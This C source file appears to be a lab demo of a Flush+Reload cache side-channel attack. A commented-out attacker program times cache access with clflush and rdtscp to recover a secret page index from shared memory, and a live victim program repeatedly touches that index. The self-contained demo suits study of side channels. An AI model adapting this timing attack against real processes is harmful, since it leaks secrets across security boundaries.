// #define _POSIX_C_SOURCE 200809L

// #include <errno.h>
// #include <fcntl.h>
// #include <immintrin.h>
// #include <limits.h>
// #include <signal.h>
// #include <stdint.h>
// #include <stdio.h>
// #include <stdlib.h>
// #include <string.h>
// #include <sys/mman.h>
// #include <sys/stat.h>
// #include <time.h>
// #include <unistd.h>

// #include "../shared/shared_mem.h"

// #define CALIBRATION_ROUNDS 1000
// #define ATTACK_ROUNDS 40
// #define TOP_RESULTS 3
// #define DEFAULT_WINDOW_NS 200000L
// #define DEFAULT_SLEEP_NS 50000000L

// typedef struct {
//     uint64_t total_cycles;
//     uint64_t min_cycles;
//     uint64_t max_cycles;
//     int hits_below_threshold;
// } page_stats_t;

// static volatile uint8_t *shared_mem = NULL;
// static int shm_fd = -1;
// static volatile sig_atomic_t keep_running = 1;

// static void handle_signal(int sig) {
//     (void)sig;
//     keep_running = 0;
// }

// static inline void serialize_cpu(void) {
// #if defined(__x86_64__) || defined(__i386__)
//     _mm_lfence();
// #endif
// }

// static inline void flush_line(volatile uint8_t *addr) {
// #if defined(__x86_64__) || defined(__i386__)
//     _mm_clflush((const void *)addr);
// #endif
// }

// static inline uint64_t measure_access_time(volatile uint8_t *addr) {
//     unsigned int aux = 0;
//     uint64_t start, end;

//     serialize_cpu();
//     start = __rdtscp(&aux);

//     (void)*addr;

//     serialize_cpu();
//     end = __rdtscp(&aux);
//     serialize_cpu();

//     return end - start;
// }

// static void flush_all_pages(void) {
//     for (int i = 0; i < PAGE_COUNT; i++) {
//         flush_line(&shared_mem[i * STRIDE]);
//     }
//     serialize_cpu();
// }

// static uint64_t average_cached_time(void) {
//     uint64_t total = 0;
//     volatile uint8_t *addr = &shared_mem[SECRET_INDEX];

//     for (int i = 0; i < CALIBRATION_ROUNDS; i++) {
//         (void)*addr;
//         serialize_cpu();
//         total += measure_access_time(addr);
//     }

//     return total / CALIBRATION_ROUNDS;
// }

// static uint64_t average_flushed_time(void) {
//     uint64_t total = 0;
//     volatile uint8_t *addr = &shared_mem[SECRET_INDEX];

//     for (int i = 0; i < CALIBRATION_ROUNDS; i++) {
//         flush_line(addr);
//         serialize_cpu();
//         total += measure_access_time(addr);
//     }

//     return total / CALIBRATION_ROUNDS;
// }

// static int derive_threshold(uint64_t cached_avg, uint64_t flushed_avg) {
//     if (flushed_avg <= cached_avg) {
//         return (int)(cached_avg + 20);
//     }
//     return (int)((cached_avg + flushed_avg) / 2);
// }

// static void sleep_ns(long nanoseconds) {
//     struct timespec ts;
//     ts.tv_sec = nanoseconds / 1000000000L;
//     ts.tv_nsec = nanoseconds % 1000000000L;
//     nanosleep(&ts, NULL);
// }

// static void reset_page_stats(page_stats_t stats[PAGE_COUNT]) {
//     for (int i = 0; i < PAGE_COUNT; i++) {
//         stats[i].total_cycles = 0;
//         stats[i].min_cycles = UINT64_MAX;
//         stats[i].max_cycles = 0;
//         stats[i].hits_below_threshold = 0;
//     }
// }

// static void update_top_candidates(const page_stats_t stats[PAGE_COUNT],
//                                   int top_pages[TOP_RESULTS],
//                                   uint64_t top_scores[TOP_RESULTS]) {
//     for (int k = 0; k < TOP_RESULTS; k++) {
//         top_pages[k] = -1;
//         top_scores[k] = UINT64_MAX;
//     }

//     for (int i = 0; i < PAGE_COUNT; i++) {
//         uint64_t avg = stats[i].total_cycles / ATTACK_ROUNDS;

//         for (int k = 0; k < TOP_RESULTS; k++) {
//             if (avg < top_scores[k]) {
//                 for (int j = TOP_RESULTS - 1; j > k; j--) {
//                     top_scores[j] = top_scores[j - 1];
//                     top_pages[j] = top_pages[j - 1];
//                 }
//                 top_scores[k] = avg;
//                 top_pages[k] = i;
//                 break;
//             }
//         }
//     }
// }

// int main(void) {
//     signal(SIGINT, handle_signal);
//     signal(SIGTERM, handle_signal);

//     shm_fd = shm_open(SHM_NAME, O_RDWR, 0666);
//     if (shm_fd < 0) {
//         fprintf(stderr, "shm_open failed for %s: %s\n", SHM_NAME, strerror(errno));
//         fprintf(stderr, "Start victim first so the shared memory exists.\n");
//         return EXIT_FAILURE;
//     }

//     shared_mem = mmap(NULL, SHM_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
//     if (shared_mem == MAP_FAILED) {
//         perror("mmap failed");
//         close(shm_fd);
//         return EXIT_FAILURE;
//     }

//     page_stats_t stats[PAGE_COUNT];
//     int winner_counts[PAGE_COUNT];
//     memset(winner_counts, 0, sizeof(winner_counts));

//     printf("Attacker started.\n");
//     printf("Attached to shared memory: %s\n", SHM_NAME);
//     printf("Scanning %d pages with stride %d.\n", PAGE_COUNT, STRIDE);
//     printf("Running calibration for cached vs flushed access...\n");

//     uint64_t cached_avg = average_cached_time();
//     uint64_t flushed_avg = average_flushed_time();
//     int threshold = derive_threshold(cached_avg, flushed_avg);

//     printf("Calibration complete.\n");
//     printf("Average cached access : %llu cycles\n", (unsigned long long)cached_avg);
//     printf("Average flushed access: %llu cycles\n", (unsigned long long)flushed_avg);
//     printf("Chosen threshold      : %d cycles\n", threshold);
//     printf("Attack rounds per scan: %d\n", ATTACK_ROUNDS);
//     printf("Press Ctrl+C to stop.\n\n");

//     while (keep_running) {
//         reset_page_stats(stats);

//         for (int round = 0; round < ATTACK_ROUNDS; round++) {
//             flush_all_pages();
//             sleep_ns(DEFAULT_WINDOW_NS);

//             for (int i = 0; i < PAGE_COUNT; i++) {
//                 uint64_t cycles = measure_access_time(&shared_mem[i * STRIDE]);
//                 stats[i].total_cycles += cycles;

//                 if (cycles < stats[i].min_cycles) {
//                     stats[i].min_cycles = cycles;
//                 }

//                 if (cycles > stats[i].max_cycles) {
//                     stats[i].max_cycles = cycles;
//                 }

//                 if ((int)cycles <= threshold) {
//                     stats[i].hits_below_threshold++;
//                 }
//             }
//         }

//         int top_pages[TOP_RESULTS];
//         uint64_t top_scores[TOP_RESULTS];
//         update_top_candidates(stats, top_pages, top_scores);

//         int winner = top_pages[0];
//         if (winner >= 0) {
//             winner_counts[winner]++;

//             int total_wins = 0;
//             for (int i = 0; i < PAGE_COUNT; i++) {
//                 total_wins += winner_counts[i];
//             }

//             double confidence = total_wins
//                 ? (100.0 * winner_counts[winner] / total_wins)
//                 : 0.0;

//             printf("Top candidates: ");
//             for (int k = 0; k < TOP_RESULTS; k++) {
//                 if (top_pages[k] >= 0) {
//                     uint64_t avg = stats[top_pages[k]].total_cycles / ATTACK_ROUNDS;
//                     printf("#%d page=%d avg=%llu hits=%d  ",
//                            k + 1,
//                            top_pages[k],
//                            (unsigned long long)avg,
//                            stats[top_pages[k]].hits_below_threshold);
//                 }
//             }
//             printf("\n");

//             printf("Winner page index: %d | Estimated secret: %d | Avg cycles: %llu | Min: %llu | Max: %llu | Confidence: %.2f%%\n\n",
//                    winner,
//                    winner,
//                    (unsigned long long)(stats[winner].total_cycles / ATTACK_ROUNDS),
//                    (unsigned long long)stats[winner].min_cycles,
//                    (unsigned long long)stats[winner].max_cycles,
//                    confidence);
//         }

//         sleep_ns(DEFAULT_SLEEP_NS);
//     }

//     printf("Attacker stopping.\n");

//     if (shared_mem && shared_mem != MAP_FAILED) {
//         munmap((void *)shared_mem, SHM_SIZE);
//     }

//     if (shm_fd >= 0) {
//         close(shm_fd);
//     }

//     return EXIT_SUCCESS;
// }


#define _POSIX_C_SOURCE 200809L

#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

#include "../shared/shared_mem.h"

static volatile uint8_t *shared_mem = NULL;
static int shm_fd = -1;
static volatile sig_atomic_t keep_running = 1;

static void handle_signal(int sig) {
    (void)sig;
    keep_running = 0;
}

static void cleanup(void) {
    if (shared_mem && shared_mem != MAP_FAILED) {
        munmap((void *)shared_mem, SHM_SIZE);
    }

    if (shm_fd >= 0) {
        close(shm_fd);
    }

    shm_unlink(SHM_NAME);
}

int main(void) {
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    shm_fd = shm_open(SHM_NAME, O_CREAT | O_RDWR, 0666);
    if (shm_fd < 0) {
        perror("shm_open failed");
        return EXIT_FAILURE;
    }

    if (ftruncate(shm_fd, SHM_SIZE) == -1) {
        perror("ftruncate failed");
        close(shm_fd);
        shm_unlink(SHM_NAME);
        return EXIT_FAILURE;
    }

    shared_mem = mmap(NULL, SHM_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (shared_mem == MAP_FAILED) {
        perror("mmap failed");
        close(shm_fd);
        shm_unlink(SHM_NAME);
        return EXIT_FAILURE;
    }

    atexit(cleanup);
    memset((void *)shared_mem, 1, SHM_SIZE);

    printf("Victim started.\n");
    printf("Shared memory object : %s\n", SHM_NAME);
    printf("Secret value         : %d\n", SECRET_VALUE);
    printf("Secret index         : %d (123 * 4096)\n", SECRET_INDEX);
    printf("Victim keeps touching shared_mem[%d] in a while loop.\n", SECRET_INDEX);
    printf("Press Ctrl+C to stop.\n\n");

    volatile uint8_t sink = 0;
    unsigned long long iterations = 0;

    while (keep_running) {
        sink &= shared_mem[SECRET_INDEX];
        sink ^= shared_mem[SECRET_INDEX];

        shared_mem[SECRET_INDEX] = (uint8_t)(shared_mem[SECRET_INDEX] + 1);
        shared_mem[SECRET_INDEX] = (uint8_t)(shared_mem[SECRET_INDEX] - 1);

        iterations++;

        if ((iterations % 5000000ULL) == 0) {
            printf("Victim heartbeat -> touched secret index %d for %llu iterations\n",
                   SECRET_INDEX, iterations);
            fflush(stdout);
        }
    }

    printf("\nVictim stopped after %llu iterations.\n", iterations);
    (void)sink;
    return EXIT_SUCCESS;
}